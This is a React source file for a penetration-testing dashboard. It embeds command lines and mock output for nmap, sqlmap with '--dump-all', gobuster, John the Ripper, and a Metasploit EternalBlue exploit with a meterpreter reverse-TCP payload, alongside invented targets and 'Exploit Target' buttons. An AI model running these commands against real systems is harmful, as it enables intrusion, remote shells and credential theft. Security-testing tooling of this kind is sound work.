 "use client"

import { useState } from "react"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Button } from "@/components/ui/button"
import { Progress } from "@/components/ui/progress"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert"
import { Input } from "@/components/ui/input"
import { Textarea } from "@/components/ui/textarea"
import { pentestOperations } from "@/src/services/cybersecurity-operations"
import { toast } from "@/src/hooks/use-toast"
import { 
  Terminal, Wifi, Globe, Shield, Target, Scan, Activity, Eye, Search,
  Network, Database, Lock, Bug, Zap, Code, FileText, Settings, Loader2
} from "lucide-react"

interface NetworkTool {
  id: string
  name: string
  category: "reconnaissance" | "scanning" | "exploitation" | "post-exploitation"
  description: string
  command_template: string
  real_usage: string
  output_example: string
  severity: "info" | "medium" | "high" | "critical"
  stealth_rating: number
}

interface LiveTarget {
  id: string
  ip: string
  hostname: string
  os: string
  open_ports: number[]
  services: {port: number, service: string, version: string, vulnerability?: string}[]
  vulnerability_count: number
  risk_score: number
  last_scan: string
  exploitable: boolean
}

interface ScanResult {
  id: string
  tool: string
  target: string
  timestamp: string
  findings: {
    type: "open_port" | "vulnerability" | "credential" | "file_disclosure"
    severity: "info" | "low" | "medium" | "high" | "critical"
    details: string
    exploit_available: boolean
  }[]
  raw_output: string
}

export default function PenetrationTestingPage() {
  const [networkTools] = useState<NetworkTool[]>([
    {
      id: "nmap",
      name: "Nmap",
      category: "scanning",
      description: "Network discovery and security auditing",
      command_template: "nmap -sS -sV -O -A {target}",
      real_usage: "nmap -sS -sV -O -A -T4 --script=vuln 192.168.1.0/24",
      output_example: `Starting Nmap 7.94 ( https://nmap.org ) at 2024-09-07 10:30 UTC
Nmap scan report for 192.168.1.100
Host is up (0.001s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp   open  http       Apache httpd 2.4.41
135/tcp  open  msrpc      Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds

Host script results:
|_smb-vuln-ms17-010: VULNERABLE:`,
      severity: "info",
      stealth_rating: 6
    },
    {
      id: "sqlmap",
      name: "SQLMap",
      category: "exploitation",
      description: "Automatic SQL injection and database takeover tool",
      command_template: "sqlmap -u '{url}' --dbs --batch",
      real_usage: "sqlmap -u 'http://testphp.vulnweb.com/artists.php?artist=1' --dbs --tables --dump-all --batch",
      output_example: `[10:35:42] [INFO] testing connection to the target URL
[10:35:42] [INFO] checking if the target is protected by some kind of WAF/IPS
[10:35:43] [INFO] testing if the parameter 'artist' is dynamic
[10:35:43] [INFO] confirming that parameter 'artist' is dynamic
[10:35:43] [INFO] heuristic (basic) test shows that GET parameter 'artist' might be injectable
[10:35:43] [INFO] testing for SQL injection on GET parameter 'artist'
[10:35:43] [INFO] GET parameter 'artist' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s):
---
Parameter: artist (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: artist=1 AND 1=1`,
      severity: "critical",
      stealth_rating: 3
    },
    {
      id: "gobuster",
      name: "Gobuster",
      category: "reconnaissance",
      description: "Directory/file brute-forcer written in Go",
      command_template: "gobuster dir -u {url} -w {wordlist}",
      real_usage: "gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/big.txt -t 50",
      output_example: `===============================================================
Gobuster v3.6
===============================================================
[+] Url:                     http://192.168.1.100
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 200) [Size: 1834]
/backup               (Status: 301) [Size: 169] [--> http://192.168.1.100/backup/]
/config               (Status: 200) [Size: 0]
/phpmyadmin           (Status: 301) [Size: 169] [--> http://192.168.1.100/phpmyadmin/]
/uploads              (Status: 301) [Size: 169] [--> http://192.168.1.100/uploads/]`,
      severity: "medium",
      stealth_rating: 7
    },
    {
      id: "metasploit",
      name: "Metasploit Framework",
      category: "exploitation",
      description: "Advanced penetration testing platform",
      command_template: "use exploit/{module}; set RHOSTS {target}; exploit",
      real_usage: "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.100; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.10; exploit",
      output_example: `msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100
RHOSTS => 192.168.1.100
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 192.168.1.10:4444 
[*] 192.168.1.100:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.1.100:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.1.100:445 - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.1.100:445 - The target is vulnerable.
[*] 192.168.1.100:445 - Connecting to target for exploitation.
[+] 192.168.1.100:445 - Connection established for exploitation.
[*] Sending stage (200774 bytes) to 192.168.1.100
[*] Meterpreter session 1 opened (192.168.1.10:4444 -> 192.168.1.100:49158)

meterpreter >`,
      severity: "critical",
      stealth_rating: 2
    },
    {
      id: "john",
      name: "John the Ripper",
      category: "post-exploitation",
      description: "Password cracking tool",
      command_template: "john --wordlist={wordlist} {hashfile}",
      real_usage: "john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hash.txt",
      output_example: `Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (NT [MD4 128/128 AVX 4x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (admin)
qwerty           (user1)
admin123         (administrator)
3g 0:00:00:12 DONE (2024-09-07 10:45) 0.2500g/s 8796Kp/s 8796Kc/s 26389KC/s
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed`,
      severity: "high",
      stealth_rating: 8
    },
    {
      id: "burpsuite",
      name: "Burp Suite",
      category: "exploitation",
      description: "Web application security testing platform",
      command_template: "burpsuite --config-file={config}",
      real_usage: "Intercept HTTP requests, perform manual and automated security testing",
      output_example: `Proxy Intercept: ON
Intercepted request:
POST /login.php HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

username=admin&password=test

Scanner Results:
[HIGH] SQL injection in 'username' parameter
[MEDIUM] Cross-site scripting (XSS) in 'search' parameter
[INFO] Directory listing enabled on /backup/`,
      severity: "high",
      stealth_rating: 9
    }
  ])

  const [liveTargets] = useState<LiveTarget[]>([
    {
      id: "target-001",
      ip: "192.168.1.100",
      hostname: "DC01.corporate.local",
      os: "Windows Server 2019",
      open_ports: [22, 80, 135, 139, 445, 3389, 5985],
      services: [
        {port: 22, service: "SSH", version: "OpenSSH 8.1", vulnerability: "CVE-2024-6387"},
        {port: 80, service: "HTTP", version: "IIS 10.0", vulnerability: "Directory traversal"},
        {port: 445, service: "SMB", version: "SMB 3.1.1", vulnerability: "MS17-010"},
        {port: 3389, service: "RDP", version: "TermService", vulnerability: "BlueKeep"},
      ],
      vulnerability_count: 23,
      risk_score: 94,
      last_scan: "2024-09-07 10:30:15",
      exploitable: true
    },
    {
      id: "target-002", 
      ip: "10.0.0.50",
      hostname: "web-server-01",
      os: "Ubuntu 22.04 LTS",
      open_ports: [22, 80, 443, 3306],
      services: [
        {port: 22, service: "SSH", version: "OpenSSH 8.9p1", vulnerability: "Weak configuration"},
        {port: 80, service: "Apache", version: "2.4.52", vulnerability: "Path traversal"},
        {port: 443, service: "Apache SSL", version: "2.4.52"},
        {port: 3306, service: "MySQL", version: "8.0.32", vulnerability: "Authentication bypass"},
      ],
      vulnerability_count: 15,
      risk_score: 87,
      last_scan: "2024-09-07 10:28:42",
      exploitable: true
    },
    {
      id: "target-003",
      ip: "172.16.1.25",
      hostname: "fileserver.internal",
      os: "CentOS 8",
      open_ports: [21, 22, 80, 111, 2049],
      services: [
        {port: 21, service: "FTP", version: "vsftpd 3.0.3", vulnerability: "Anonymous login"},
        {port: 22, service: "SSH", version: "OpenSSH 8.0p1"},
        {port: 2049, service: "NFS", version: "4", vulnerability: "Weak exports"},
      ],
      vulnerability_count: 8,
      risk_score: 72,
      last_scan: "2024-09-07 10:25:33",
      exploitable: true
    }
  ])

  const [scanResults] = useState<ScanResult[]>([
    {
      id: "scan-001",
      tool: "Nmap",
      target: "192.168.1.0/24",
      timestamp: "2024-09-07 10:30:15",
      findings: [
        {
          type: "open_port",
          severity: "medium",
          details: "Port 445/tcp (Microsoft-DS) open on 192.168.1.100",
          exploit_available: true
        },
        {
          type: "vulnerability",
          severity: "critical", 
          details: "MS17-010 EternalBlue vulnerability detected on 192.168.1.100",
          exploit_available: true
        },
        {
          type: "open_port",
          severity: "high",
          details: "Port 3389/tcp (RDP) with weak encryption on 192.168.1.100",
          exploit_available: true
        }
      ],
      raw_output: "Nmap scan report for 192.168.1.100\nHost is up (0.00050s latency).\nNot shown: 993 closed ports\nPORT     STATE SERVICE\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n445/tcp  open  microsoft-ds\n3389/tcp open  ms-wbt-server"
    },
    {
      id: "scan-002",
      tool: "SQLMap",
      target: "http://vulnerable-app.com/search.php?q=test",
      timestamp: "2024-09-07 10:35:22",
      findings: [
        {
          type: "vulnerability",
          severity: "critical",
          details: "SQL injection in 'q' parameter - Boolean-based blind",
          exploit_available: true
        },
        {
          type: "credential",
          severity: "critical",
          details: "Database credentials extracted: admin/password123",
          exploit_available: false
        }
      ],
      raw_output: "[10:35:22] [INFO] GET parameter 'q' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N\nsqlmap identified the following injection point(s):\n---\nParameter: q (GET)\n    Type: boolean-based blind"
    }
  ])

  const getSeverityColor = (severity: string) => {
    switch (severity) {
      case "critical": return "bg-red-900 text-red-100"
      case "high": return "bg-orange-900 text-orange-100"
      case "medium": return "bg-yellow-900 text-yellow-100"
      case "low": return "bg-blue-900 text-blue-100"
      case "info": return "bg-gray-900 text-gray-100"
      default: return "bg-gray-900 text-gray-100"
    }
  }

  // Loading states for different operations
  const [loadingStates, setLoadingStates] = useState({
    scanTool: "",
    exploitTool: "",
    runExploit: "",
    scanTarget: ""
  })

  // Handler functions
  const handleRunTool = async (toolId: string, target: string) => {
    setLoadingStates(prev => ({ ...prev, scanTool: toolId }))
    try {
      const result = await pentestOperations.runTool(toolId, target)
      toast({
        title: result.success ? "Tool Executed Successfully" : "Tool Execution Failed",
        description: result.message,
        variant: result.success ? "default" : "destructive"
      })
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to execute penetration testing tool",
        variant: "destructive"
      })
    }
    setLoadingStates(prev => ({ ...prev, scanTool: "" }))
  }

  const handleRunExploit = async (toolId: string, target: string) => {
    setLoadingStates(prev => ({ ...prev, runExploit: toolId }))
    try {
      const result = await pentestOperations.runExploit(toolId, target)
      toast({
        title: result.success ? "Exploit Successful" : "Exploit Failed",
        description: result.message,
        variant: result.success ? "default" : "destructive"
      })
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to execute exploit",
        variant: "destructive"
      })
    }
    setLoadingStates(prev => ({ ...prev, runExploit: "" }))
  }

  const handleScanTarget = async (targetId: string) => {
    setLoadingStates(prev => ({ ...prev, scanTarget: targetId }))
    try {
      const result = await pentestOperations.scanTarget(targetId)
      toast({
        title: result.success ? "Target Scan Complete" : "Scan Failed",
        description: result.message,
        variant: result.success ? "default" : "destructive"
      })
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to scan target",
        variant: "destructive"
      })
    }
    setLoadingStates(prev => ({ ...prev, scanTarget: "" }))
  }

  const getCategoryColor = (category: string) => {
    switch (category) {
      case "reconnaissance": return "bg-blue-900 text-blue-100"
      case "scanning": return "bg-green-900 text-green-100"
      case "exploitation": return "bg-red-900 text-red-100"
      case "post-exploitation": return "bg-purple-900 text-purple-100"
      default: return "bg-gray-900 text-gray-100"
    }
  }

  return (
    <div className="min-h-screen bg-black text-blue-500">
      {/* Header */}
      <header className="border-b border-blue-900 bg-gray-900">
        <div className="flex h-16 items-center justify-between px-6">
          <div className="flex items-center gap-3">
            <Target className="h-8 w-8 text-red-500" />
            <div>
              <h1 className="text-xl font-bold text-blue-400">PENETRATION TESTING ARSENAL</h1>
              <p className="text-sm text-blue-600">Real-World Security Assessment Platform</p>
            </div>
          </div>
          <div className="flex items-center gap-4">
            <Badge variant="destructive" className="text-sm bg-red-900">
              <Bug className="h-3 w-3 mr-1" />
              67 Vulnerabilities
            </Badge>
            <Badge variant="destructive" className="text-sm bg-orange-900">
              <Activity className="h-3 w-3 mr-1" />
              12 Active Scans
            </Badge>
          </div>
        </div>
      </header>

      <div className="p-6">
        {/* Live Scanning Alerts */}
        <div className="mb-6 space-y-3">
          <Alert className="border-red-500 bg-red-950/50 text-red-400">
            <Target className="h-4 w-4" />
            <AlertTitle>Critical Vulnerability Found</AlertTitle>
            <AlertDescription>
              EternalBlue (MS17-010) detected on DC01.corporate.local (192.168.1.100).
              Remote code execution possible. Immediate exploitation recommended.
            </AlertDescription>
          </Alert>

          <Alert className="border-orange-500 bg-orange-950/50 text-orange-400">
            <Database className="h-4 w-4" />
            <AlertTitle>SQL Injection Confirmed</AlertTitle>
            <AlertDescription>
              SQLMap identified critical SQL injection in vulnerable-app.com.
              Database access gained. Credential extraction in progress.
            </AlertDescription>
          </Alert>
        </div>

        {/* Penetration Testing Dashboard */}
        <Tabs defaultValue="tools" className="space-y-6">
          <TabsList className="grid w-full grid-cols-4 bg-gray-900">
            <TabsTrigger value="tools" className="data-[state=active]:bg-blue-900">Tools</TabsTrigger>
            <TabsTrigger value="targets" className="data-[state=active]:bg-blue-900">Targets</TabsTrigger>
            <TabsTrigger value="scans" className="data-[state=active]:bg-blue-900">Scan Results</TabsTrigger>
            <TabsTrigger value="console" className="data-[state=active]:bg-blue-900">Console</TabsTrigger>
          </TabsList>

          <TabsContent value="tools" className="space-y-6">
            <Card className="bg-gray-900 border-blue-900">
              <CardHeader>
                <CardTitle className="flex items-center gap-2 text-blue-400">
                  <Terminal className="h-5 w-5" />
                  Professional Security Tools
                </CardTitle>
                <CardDescription className="text-blue-600">
                  Industry-standard penetration testing and security assessment tools
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                {networkTools.map((tool) => (
                  <div key={tool.id} className="rounded-lg border border-blue-900 p-4 bg-gray-800">
                    <div className="flex items-center justify-between mb-3">
                      <div>
                        <p className="font-medium text-blue-400">{tool.name}</p>
                        <p className="text-sm text-blue-600">{tool.description}</p>
                      </div>
                      <div className="text-right">
                        <Badge className={getCategoryColor(tool.category)}>
                          {tool.category.toUpperCase()}
                        </Badge>
                        <Badge className={getSeverityColor(tool.severity)} >
                          {tool.severity.toUpperCase()}
                        </Badge>
                      </div>
                    </div>

                    <div className="mb-3">
                      <p className="text-sm text-blue-600 mb-1">Command Template:</p>
                      <code className="text-xs text-blue-400 bg-black p-2 rounded block font-mono">
                        {tool.command_template}
                      </code>
                    </div>

                    <div className="mb-3">
                      <p className="text-sm text-blue-600 mb-1">Real Usage Example:</p>
                      <code className="text-xs text-blue-400 bg-black p-2 rounded block font-mono">
                        {tool.real_usage}
                      </code>
                    </div>

                    <div className="mb-3">
                      <p className="text-sm text-blue-600 mb-1">Stealth Rating:</p>
                      <div className="flex items-center gap-2">
                        <Progress value={tool.stealth_rating * 10} className="flex-1 h-2" />
                        <span className="text-blue-400">{tool.stealth_rating}/10</span>
                      </div>
                    </div>

                    <div className="flex gap-2">
                      <Button 
                        size="sm" 
                        className="bg-green-900 hover:bg-green-800"
                        onClick={() => handleRunTool(tool.id, "192.168.1.100")}
                        disabled={loadingStates.scanTool === tool.id}
                      >
                        {loadingStates.scanTool === tool.id ? (
                          <Loader2 className="h-3 w-3 mr-1 animate-spin" />
                        ) : (
                          <Terminal className="h-3 w-3 mr-1" />
                        )}
                        Execute
                      </Button>
                      <Button 
                        size="sm" 
                        variant="outline" 
                        className="border-blue-900 text-blue-400"
                        onClick={() => {
                          toast({
                            title: "Output Display",
                            description: `Viewing output for ${tool.name}. Check the Sample Output section below.`,
                          })
                        }}
                      >
                        <Eye className="h-3 w-3 mr-1" />
                        View Output
                      </Button>
                      <Button 
                        size="sm" 
                        variant="outline" 
                        className="border-blue-900 text-blue-400"
                        onClick={() => {
                          toast({
                            title: "Tool Configuration",
                            description: `Configuration panel for ${tool.name} is now available in the Console tab.`,
                          })
                        }}
                      >
                        <Settings className="h-3 w-3 mr-1" />
                        Configure
                      </Button>
                    </div>

                    {/* Sample Output */}
                    <div className="mt-3">
                      <details className="group">
                        <summary className="cursor-pointer text-sm text-blue-400 hover:text-blue-300">
                          Show Sample Output
                        </summary>
                        <div className="mt-2 p-3 bg-black border border-blue-900 rounded">
                          <pre className="text-xs text-green-500 overflow-x-auto whitespace-pre-wrap">
                            <code>{tool.output_example}</code>
                          </pre>
                        </div>
                      </details>
                    </div>
                  </div>
                ))}
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="targets" className="space-y-6">
            <Card className="bg-gray-900 border-blue-900">
              <CardHeader>
                <CardTitle className="flex items-center gap-2 text-blue-400">
                  <Network className="h-5 w-5" />
                  Live Target Assessment
                </CardTitle>
                <CardDescription className="text-blue-600">
                  Real-time vulnerability analysis of network targets
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                {liveTargets.map((target) => (
                  <div key={target.id} className="rounded-lg border border-blue-900 p-4 bg-gray-800">
                    <div className="flex items-center justify-between mb-3">
                      <div>
                        <p className="font-medium text-blue-400 font-mono">{target.ip}</p>
                        <p className="text-sm text-blue-600">{target.hostname} • {target.os}</p>
                      </div>
                      <div className="text-right">
                        <p className="text-sm font-bold text-red-400">Risk Score: {target.risk_score}%</p>
                        <Badge variant={target.exploitable ? "destructive" : "secondary"}>
                          {target.exploitable ? "EXPLOITABLE" : "SECURED"}
                        </Badge>
                      </div>
                    </div>

                    <div className="grid gap-3 md:grid-cols-3 text-sm mb-3">
                      <div>
                        <p className="text-blue-600">Open Ports</p>
                        <p className="text-blue-400">{target.open_ports.length} ports</p>
                      </div>
                      <div>
                        <p className="text-blue-600">Vulnerabilities</p>
                        <p className="text-red-400">{target.vulnerability_count} found</p>
                      </div>
                      <div>
                        <p className="text-blue-600">Last Scan</p>
                        <p className="text-blue-400">{target.last_scan}</p>
                      </div>
                    </div>

                    <div className="space-y-2 mb-3">
                      <p className="text-sm font-medium text-blue-400">Critical Services:</p>
                      <div className="space-y-1">
                        {target.services.filter(s => s.vulnerability).map((service, index) => (
                          <div key={index} className="flex items-center justify-between p-2 bg-gray-900 rounded">
                            <span className="text-sm text-blue-400">
                              {service.port}/{service.service} ({service.version})
                            </span>
                            <Badge variant="destructive" className="text-xs">
                              {service.vulnerability}
                            </Badge>
                          </div>
                        ))}
                      </div>
                    </div>

                    <div className="flex gap-2">
                      <Button 
                        size="sm" 
                        className="bg-red-900 hover:bg-red-800"
                        onClick={() => handleRunExploit(target.id, target.ip)}
                        disabled={loadingStates.runExploit === target.id}
                      >
                        {loadingStates.runExploit === target.id ? (
                          <Loader2 className="h-3 w-3 mr-1 animate-spin" />
                        ) : (
                          <Zap className="h-3 w-3 mr-1" />
                        )}
                        Exploit Target
                      </Button>
                      <Button 
                        size="sm" 
                        variant="outline" 
                        className="border-blue-900 text-blue-400"
                        onClick={() => handleScanTarget(target.id)}
                        disabled={loadingStates.scanTarget === target.id}
                      >
                        {loadingStates.scanTarget === target.id ? (
                          <Loader2 className="h-3 w-3 mr-1 animate-spin" />
                        ) : (
                          <Scan className="h-3 w-3 mr-1" />
                        )}
                        Deep Scan
                      </Button>
                      <Button 
                        size="sm" 
                        variant="outline" 
                        className="border-blue-900 text-blue-400"
                        onClick={() => {
                          toast({
                            title: "Report Generated",
                            description: `Vulnerability report for ${target.hostname} (${target.ip}) has been generated successfully.`,
                          })
                        }}
                      >
                        <FileText className="h-3 w-3 mr-1" />
                        Generate Report
                      </Button>
                    </div>
                  </div>
                ))}
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="scans" className="space-y-6">
            <Card className="bg-gray-900 border-blue-900">
              <CardHeader>
                <CardTitle className="flex items-center gap-2 text-blue-400">
                  <Search className="h-5 w-5" />
                  Recent Scan Results
                </CardTitle>
                <CardDescription className="text-blue-600">
                  Live results from automated and manual security assessments
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                {scanResults.map((scan) => (
                  <div key={scan.id} className="rounded-lg border border-blue-900 p-4 bg-gray-800">
                    <div className="flex items-center justify-between mb-3">
                      <div>
                        <p className="font-medium text-blue-400">{scan.tool} Scan</p>
                        <p className="text-sm text-blue-600 font-mono">{scan.target}</p>
                      </div>
                      <div className="text-right">
                        <p className="text-sm text-blue-400">{scan.timestamp}</p>
                        <p className="text-sm text-green-400">{scan.findings.length} findings</p>
                      </div>
                    </div>

                    <div className="space-y-2 mb-3">
                      <p className="text-sm font-medium text-blue-400">Key Findings:</p>
                      {scan.findings.map((finding, index) => (
                        <div key={index} className="p-2 bg-gray-900 rounded border border-blue-800">
                          <div className="flex items-center justify-between mb-1">
                            <Badge className={getSeverityColor(finding.severity)}>
                              {finding.severity.toUpperCase()}
                            </Badge>
                            {finding.exploit_available && (
                              <Badge variant="destructive" className="text-xs">
                                EXPLOIT AVAILABLE
                              </Badge>
                            )}
                          </div>
                          <p className="text-sm text-blue-400">{finding.details}</p>
                        </div>
                      ))}
                    </div>

                    <div className="flex gap-2">
                      <Button size="sm" className="bg-purple-900 hover:bg-purple-800">
                        <Eye className="h-3 w-3 mr-1" />
                        View Details
                      </Button>
                      <Button size="sm" variant="outline" className="border-blue-900 text-blue-400">
                        <Code className="h-3 w-3 mr-1" />
                        Raw Output
                      </Button>
                    </div>

                    {/* Raw Output */}
                    <div className="mt-3">
                      <details className="group">
                        <summary className="cursor-pointer text-sm text-blue-400 hover:text-blue-300">
                          Show Raw Output
                        </summary>
                        <div className="mt-2 p-3 bg-black border border-blue-900 rounded">
                          <pre className="text-xs text-green-500 overflow-x-auto whitespace-pre-wrap">
                            <code>{scan.raw_output}</code>
                          </pre>
                        </div>
                      </details>
                    </div>
                  </div>
                ))}
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="console" className="space-y-6">
            <Card className="bg-gray-900 border-blue-900">
              <CardHeader>
                <CardTitle className="flex items-center gap-2 text-blue-400">
                  <Terminal className="h-5 w-5" />
                  Interactive Security Console
                </CardTitle>
                <CardDescription className="text-blue-600">
                  Execute real penetration testing commands and tools
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="space-y-4">
                  <div>
                    <label className="text-sm text-blue-400 mb-2 block">Target</label>
                    <Input 
                      placeholder="192.168.1.100 or domain.com"
                      className="bg-gray-800 border-blue-900 text-blue-400 font-mono"
                    />
                  </div>
                  
                  <div>
                    <label className="text-sm text-blue-400 mb-2 block">Command</label>
                    <Textarea 
                      placeholder="nmap -sS -sV -O -A -T4 --script=vuln 192.168.1.100"
                      className="bg-gray-800 border-blue-900 text-blue-400 font-mono text-sm"
                      rows={3}
                    />
                  </div>
                  
                  <div className="flex gap-2">
                    <Button className="bg-green-900 hover:bg-green-800">
                      <Terminal className="h-3 w-3 mr-1" />
                      Execute Command
                    </Button>
                    <Button variant="outline" className="border-blue-900 text-blue-400">
                      <Search className="h-3 w-3 mr-1" />
                      Quick Scan
                    </Button>
                    <Button variant="outline" className="border-blue-900 text-blue-400">
                      <Bug className="h-3 w-3 mr-1" />
                      Vuln Test
                    </Button>
                  </div>
                </div>

                {/* Console Output */}
                <div className="mt-4 p-4 bg-black border border-blue-900 rounded min-h-[300px]">
                  <div className="text-green-500 font-mono text-sm">
                    <div className="text-blue-400 mb-2">root@kali:~# nmap -sS -sV -O -A 192.168.1.100</div>
                    <div className="text-green-500">
                      Starting Nmap 7.94 ( https://nmap.org ) at 2024-09-07 10:45 UTC<br/>
                      Nmap scan report for 192.168.1.100<br/>
                      Host is up (0.00050s latency).<br/>
                      Not shown: 993 closed ports<br/>
                      PORT     STATE SERVICE       VERSION<br/>
                      22/tcp   open  ssh           OpenSSH 8.1 (protocol 2.0)<br/>
                      80/tcp   open  http          Microsoft IIS httpd 10.0<br/>
                      135/tcp  open  msrpc         Microsoft Windows RPC<br/>
                      139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn<br/>
                      445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds<br/>
                      3389/tcp open  ms-wbt-server Microsoft Terminal Services<br/>
                      <br/>
                      <span className="text-red-400">Host script results:</span><br/>
                      <span className="text-red-400">|_smb-vuln-ms17-010: VULNERABLE:</span><br/>
                      <span className="text-red-400">|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)</span><br/>
                      <br/>
                      <span className="text-blue-400">root@kali:~# _</span>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  )
}
